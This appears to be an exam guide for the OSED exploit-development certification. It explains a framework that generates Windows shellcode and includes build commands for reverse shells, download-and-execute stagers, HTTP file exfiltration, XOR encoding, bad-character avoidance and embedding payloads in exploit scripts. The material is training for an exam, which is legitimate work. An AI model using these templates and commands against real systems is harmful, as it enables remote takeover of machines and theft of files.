# OSED Emitter Exam Guide

**Exam-day shellcode generation with the emitter framework**

> You have a working exploit (EIP control, bad chars identified, DEP
> bypass if needed).  Now you need shellcode that fits your constraints.
> This guide covers template selection, bad-character handling,
> verification, encoding, staging, and common failures.
>
> For CLI reference and manifest format: `emitter.md`.
> For assembly-level internals: `emitter-internals.md`.

---

## 1. Template Decision Tree

Start from what the exploit needs to accomplish:

```text
What does the payload do?
  |
  +-- Execute a command (calc, cmd, etc.)
  |     -> run_command
  |        uv run emitter manifests/calc.yaml --command calc.exe
  |
  +-- Reverse shell (connect back, spawn cmd.exe)
  |     -> reverse_shell
  |        uv run emitter manifests/revshell.yaml --lhost IP --lport PORT
  |
  +-- Download a file to disk and run it
  |     +-- Over raw TCP (staging protocol)
  |     |     -> tcp_download
  |     |        uv run emitter manifests/tcp_download.yaml --lhost IP --lport PORT --dst PATH
  |     |        Serve with: python Tools/tcp_stage_server.py --port PORT --file payload.exe
  |     |
  |     +-- Over HTTP (WinInet, no Winsock setup)
  |           -> http_download
  |              uv run emitter manifests/http_download.yaml --url URL --dst PATH
  |              Serve with: python3 -m http.server PORT
  |
  +-- Download shellcode into memory and execute (no disk)
  |     -> tcp_stager (stage 1)
  |        Build stage 2 separately (any template), serve with tcp_stage_server.py
  |
  +-- Copy/move a file then run it
  |     -> copy_then_run  or  move_then_run
  |
  +-- Exfiltrate a file over HTTP POST
  |     -> http_exfil
  |        Catch with: python3 Tools/http_exfil_server.py --port PORT
  |
  +-- Something else
        -> Write a custom template (Section 7)
```

### Template size estimates

| Template | Typical size (bytes) | Notes |
|---|---|---|
| run_command | ~250-350 | Smallest; WinExec only |
| reverse_shell | ~700-900 | WSA setup + connect + CreateProcessA |
| tcp_download | ~900-1100 | Network + file I/O + WinExec |
| tcp_stager | ~600-800 | Stage 1 only; stage 2 is separate |
| http_download | ~900-1100 | WinInet handles HTTP stack |
| http_exfil | ~1000-1200 | Largest; file read + HTTP POST |
| copy_then_run | ~350-450 | CopyFileA + WinExec |

If the available buffer is under ~300 bytes, use `tcp_stager` as stage 1
and put the real payload in stage 2.

---

## 2. Bad-Character Workflow

### 2.1 Declare bad chars in the manifest

```yaml
badchars: ["00", "0a", "0d"]
```

This list flows through to every encoding decision: string construction,
immediate values, API call encodings, and the XOR encoder.

### 2.2 What the emitter handles automatically

- **String construction:** All four methods (`mov`, `shiftor`, `xor`,
  `push`) avoid badchar bytes in the generated instructions.
- **Immediate values:** IP addresses, ports, constants like
  `MAKEWORD(2,2)` are XOR-encoded if they contain bad bytes.
- **Stack frame setup:** The `sub esp, N` frame allocation is encoded
  to avoid bad bytes.
- **API calls:** `safe_call_mem` encodes `call [ebp-N]` to avoid bad
  bytes in the displacement.

### 2.3 What you must handle yourself

- **The exploit delivery:** The emitter produces clean shellcode, but
  the exploit wrapper (Python script) must not introduce bad chars in
  headers, padding, or ROP chain addresses.
- **Encoder stub:** If using `--encode`, the stub itself must be clean.
  The emitter guarantees this, but verify (Section 5).
- **EIP/SEH overwrite bytes:** Gadget addresses are not part of the
  shellcode -- they are part of your exploit script.

### 2.4 Verification

After building, scan the binary output:

```bash
# Check for bad bytes in the assembled shellcode
python3 -c "
import sys
bad = {0x00, 0x0a, 0x0d}
data = open('emitter_out/bin/shellcode.bin', 'rb').read()
hits = [(i, b) for i, b in enumerate(data) if b in bad]
if hits:
    for off, val in hits:
        print(f'  BADCHAR 0x{val:02x} at offset {off}')
else:
    print(f'CLEAN: {len(data)} bytes, no bad chars')
"
```

If bad bytes are found, either:
1. Add `--encode` to apply XOR encoding, or
2. Check whether the manifest `badchars` list is complete

---

## 3. Encoding

### 3.1 When to encode

| Situation | Action |
|---|---|
| Shellcode is clean (no bad bytes in binary) | No encoding needed |
| A few bad bytes in assembled output | Use `--encode` |
| Bad chars include most of 0x00-0xFF | Encoding may fail (no valid key); use staged delivery |
| Destination is RX only (not writable) | Encoding fails at runtime (stub writes to itself) |

### 3.2 How it works

The `--encode` flag applies single-byte XOR encoding:

1. Finds a key byte not in the badchar set and not in the raw shellcode
2. XORs every payload byte with that key
3. Prepends a position-independent decoder stub (`lods`/`xor`/`stos` loop)

The final output is: `[decoder stub] + [encoded payload]`

### 3.3 Runtime requirements

The decoder stub writes to its own memory (modifying the encoded bytes
in place).  This means the shellcode region must be **writable during
decoding** and **executable after decoding**.

| DEP state | Implication |
|---|---|
| DEP off | Stack/heap shellcode is RWX by default; encoding works |
| DEP bypassed with VirtualProtect PAGE_EXECUTE_READWRITE (0x40) | RWX; encoding works |
| DEP bypassed with VirtualProtect PAGE_EXECUTE_READ (0x20) | **Encoding fails** -- stub cannot write |
| VirtualAlloc with PAGE_EXECUTE_READWRITE | RWX; encoding works |

If you used `PAGE_EXECUTE_READ` (0x20) in your DEP bypass, either:
- Change to `PAGE_EXECUTE_READWRITE` (0x40), or
- Don't encode; fix bad chars at the manifest level instead, or
- Use a staged approach where stage 1 allocates RWX and stage 2 is
  the encoded payload

### 3.4 Build with encoding

```bash
uv run emitter manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444 --encode
```

Then re-run the badchar scan from Section 2.4 on the encoder output.

---

## 4. Staging

Use staging when:
- The buffer at the crash site is too small for the full payload
- You need to deliver a large payload through a constrained channel
- You want to separate the delivery mechanism from the final payload

### 4.1 Two-stage TCP chain

```bash
# Stage 1: stager (fits in small buffer, ~600 bytes)
uv run emitter manifests/tcp_stager.yaml \
    --lhost 192.168.1.10 --lport 9002 \
    --out emitter_out/stage1/

# Stage 2: full payload (any template, no size limit)
uv run emitter manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444 \
    --out emitter_out/stage2/

# Serve stage 2
python Tools/tcp_stage_server.py --port 9002 \
    --file emitter_out/stage2/bin/shellcode.bin

# Listen for stage 2 reverse shell
nc -lvp 4444
```

**Stage 1 bad chars apply to the exploit delivery channel.**
Stage 2 bad chars apply to the TCP staging channel (typically only 0x00
matters, since raw TCP is 8-bit clean).

### 4.2 Stage sizing

Use `--payload-file` to auto-size the VirtualAlloc buffer:

```bash
uv run emitter manifests/tcp_stager.yaml \
    --lhost 192.168.1.10 --lport 9002 \
    --payload-file emitter_out/stage2/bin/shellcode.bin
```

Without `--payload-file`, VirtualAlloc defaults to 1 MiB.

### 4.3 Staging protocol

All network templates use the same wire format:

```text
[4 bytes, little-endian uint32]   payload size
[N bytes]                         raw payload
```

The `tcp_stage_server.py` script handles this automatically.

---

## 5. Verification Sequence

After building shellcode, before embedding in the exploit:

### 5.1 Static checks

```bash
# 1. Build succeeded?
# Look for: [+] Shellcode: N bytes (raw)

# 2. Bad chars clean?
python3 -c "
bad = {0x00, 0x0a, 0x0d}  # match your manifest
data = open('emitter_out/bin/shellcode.bin', 'rb').read()
hits = [(i, b) for i, b in enumerate(data) if b in bad]
print('CLEAN' if not hits else f'FAIL: {len(hits)} violations')
for off, val in hits[:10]:
    print(f'  0x{val:02x} at offset {off}')
"

# 3. Size fits?
wc -c < emitter_out/bin/shellcode.bin
# Compare against available buffer space in exploit
```

### 5.2 Dynamic checks (on target or in debugger)

1. Embed shellcode in exploit, send to target under WinDbg
2. Break at shellcode entry (after EIP redirect or ROP chain)
3. Step through PEB walk -- verify kernel32.dll base matches `lm`
4. Step through hash resolution -- verify API pointers are correct:
   `dd [ebp-<slot_offset>] L1` should match the API address
5. Step through string construction -- verify strings:
   `db [ebp-<string_offset>]`
6. Step through payload -- verify API arguments on the stack before
   each `call [ebp-N]`
7. For network payloads: verify the connection initiates
8. For file payloads: verify the file appears on disk

The generated `contract.md` has all slot offsets for the current build.

### 5.3 Common dynamic failures

| Symptom | Likely cause | Fix |
|---|---|---|
| Access violation at shellcode entry | Region not executable | Check DEP bypass; verify `!vprot` |
| PEB walk returns wrong base | TEB/PEB layout assumption wrong | Verify on target OS version |
| Hash resolution finds no match | API not exported by expected DLL | Check `dps <module_base+export_dir>` |
| String construction corrupts stack | Frame size too small | Rebuild; check manifest for large strings |
| WSAStartup fails | ws2_32.dll not loaded | Verify LoadLibraryA resolved correctly |
| connect() fails | Wrong IP/port encoding | Check bytes at the sockaddr struct offset |
| Encoder stub crashes | Region not writable | Use PAGE_EXECUTE_READWRITE (0x40) |
| Stage 2 never arrives | Stage server not running; wrong port | Verify server is listening; check firewall |
| Shellcode runs but no shell | Listener not ready; wrong port | Start listener before sending exploit |

---

## 6. Integrating Shellcode Into the Exploit

### 6.1 Output formats

The emitter produces shellcode in multiple formats:

| File | Format | Use case |
|---|---|---|
| `shellcode.bin` | Raw bytes | Direct embedding, staging server |
| `shellcode.hex` | Hex string | Manual inspection |
| `shellcode.py` | Python byte string | Embed in exploit script |
| `shellcode.c` | C byte array | Embed in C harness |

### 6.2 Python exploit integration

```python
# Load the generated shellcode
shellcode = open("emitter_out/bin/shellcode.bin", "rb").read()

# Or paste from shellcode.py:
# shellcode = b"\x89\xe5\xb9..."

# Build exploit
buf  = b"A" * offset
buf += struct.pack("<I", eip_gadget)   # EIP overwrite
buf += b"\x90" * 16                     # NOP sled (optional)
buf += shellcode
buf += b"C" * (total_len - len(buf))    # padding
```

### 6.3 Size management

If the shellcode is too large:

1. **Switch to a smaller template.** `run_command` (~300 bytes) vs
   `reverse_shell` (~800 bytes).
2. **Use staging.** `tcp_stager` (~600 bytes) fetches unlimited stage 2.
3. **Remove unnecessary APIs.** Each API adds ~4 bytes to resolution +
   the hash constant.  Remove APIs you don't use.
4. **Shorten strings.** `cmd.exe` is shorter than
   `C:\Windows\System32\cmd.exe`.

If the shellcode is too small for the buffer (unlikely to matter, but):
pad with NOPs or `\xCC` (int 3) for debugging.

---

## 7. Custom Templates in 5 Minutes

When no existing template fits, you write only the API call sequence.
The framework handles PEB walking, API resolution, string construction,
and all badchar encoding.

### Step 1: Write the manifest

```yaml
# manifests/my_payload.yaml
template: my_payload
badchars: ["00", "0a", "0d"]
functions:
  - WinExec
  - ExitProcess
strings:
  - label: cmd
    value: calc.exe
    method: mov
```

### Step 2: Write the template (~15 lines)

```python
# payload_templates/my_payload.py
from .base import PayloadTemplate, TemplateConfig
from ..encode import safe_push_imm, safe_lea, safe_call_mem

class MyPayloadTemplate(PayloadTemplate):
    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars
        we  = -layout.slot("WinExec").offset
        ep  = -layout.slot("ExitProcess").offset
        cmd = -layout.slot("cmd").offset
        return "\n".join([
            "; -- My Payload --",
            *safe_lea("eax", "ebp", cmd, bc),
            *safe_push_imm(0x1, bc),       # SW_SHOWNORMAL
            "    push eax",                 # lpCmdLine
            *safe_call_mem("ebp", we, bc),  # WinExec
            "    xor eax, eax",
            "    push eax",                 # uExitCode
            *safe_call_mem("ebp", ep, bc),  # ExitProcess
        ])
```

### Step 3: Register

In `build.py`, add to the `registry` dict:
```python
"my_payload": "Tools.emitter.payload_templates.my_payload.MyPayloadTemplate",
```

Add `"my_payload"` to `_VALID_TEMPLATES` in `schema.py`.

### Step 4: Build

```bash
uv run emitter manifests/my_payload.yaml --out emitter_out/
```

### Key rules for custom templates

- **Use `layout.slot(name)`** for all stack offsets.  Never hardcode
  `[ebp-0xNN]` -- offsets shift when you add or remove APIs/strings.
- **Use `safe_*` helpers** for all immediate values and memory
  references.  They handle badchar avoidance.
- **Push arguments right-to-left** (stdcall).
- **Check the contract.** `emitter_out/Documentation/contract.md` shows
  every slot offset for the current build.

---

## 8. String Construction Methods

Choose based on your bad-character constraints:

| Method | How it works | When to use |
|---|---|---|
| `mov` | `mov [edi+N], eax` with DWORD constants | Default; clean and fast |
| `shiftor` | Build each DWORD via `shl`+`or` (byte at a time) | When `mov` constants contain bad chars |
| `xor` | XOR-encode each DWORD against a mask | When both `mov` and `shiftor` fail |
| `push` | Push DWORDs onto stack; ESP points to result | When you need the string pointer in ESP |

All four methods avoid badchar bytes automatically.  If the string value
itself contains a bad byte, the encoding produces instructions that
construct the correct byte without ever using it as a literal.

### Choosing a method

```yaml
strings:
  - label: cmd
    value: cmd.exe
    method: mov         # try this first

  - label: long_path
    value: "C:\\Windows\\Temp\\payload.exe"
    method: shiftor     # if mov produces bad chars

  - label: url_path
    value: "/exfil"
    method: xor         # last resort for tricky values
```

In practice, `mov` works for most strings.  Switch to `shiftor` or `xor`
only if the badchar scan (Section 2.4) finds violations.

---

## 9. Troubleshooting

### Build failures

| Error | Cause | Fix |
|---|---|---|
| `KeyError: 'FunctionName'` | Function not in `api_database.py` | Add an APIRecord entry |
| `No valid XOR key found` | Too many bad chars; no single-byte key works | Reduce badchar list or use staging |
| `nasm not found` | Assembler not in PATH | Install nasm or use keystone backend |
| `Template not found` | Name not in registry or `_VALID_TEMPLATES` | Register the template (Section 7) |
| `Slot 'X' not found` | Manifest missing a function/string/variable | Add it to the manifest |

### Runtime failures

| Symptom | Diagnosis | Resolution |
|---|---|---|
| Shellcode runs, nothing happens | API resolution failed silently | Step through hash loop; verify module bases |
| Connection refused | Listener not running or wrong IP/port | Verify listener; check encoded IP bytes at sockaddr |
| File not created | CreateFileA failed | Check path string; verify directory exists on target |
| Access violation during string construction | ESP trampled frame | Check frame size vs string total; rebuild |
| Encoded shellcode crashes immediately | Stub writes to non-writable memory | Ensure region is RWX (0x40) |
| Stage 2 crashes | Stage 2 bad chars differ from stage 1 | Build stage 2 with its own badchar list (TCP is 8-bit clean) |
| WinExec runs but command fails | Path wrong or missing | Verify string bytes in debugger; check null termination |
| Reverse shell connects then dies | cmd.exe stdio redirect failed | Step through CreateProcessA args; check STARTUPINFO |

### Size problems

| Problem | Options |
|---|---|
| Shellcode too large for buffer | Use smaller template; use staging; trim APIs/strings |
| Need reverse shell in < 400 bytes | Use tcp_stager (~600) to fetch full reverse_shell as stage 2 |
| Buffer < 600 bytes | Consider egghunter instead of emitter staging |

---

## 10. Exam Checklist

```text
[ ] Bad chars identified and in manifest
[ ] Template matches the objective
[ ] Shellcode builds without errors
[ ] Badchar scan passes (Section 2.4)
[ ] Shellcode size fits available buffer
[ ] If encoded: destination is RWX (not just RX)
[ ] If staged: stage server running, listener ready
[ ] Shellcode embedded in exploit script
[ ] Exploit tested end-to-end on target
[ ] Listener/handler ready before sending exploit
[ ] contract.md saved for reference
```
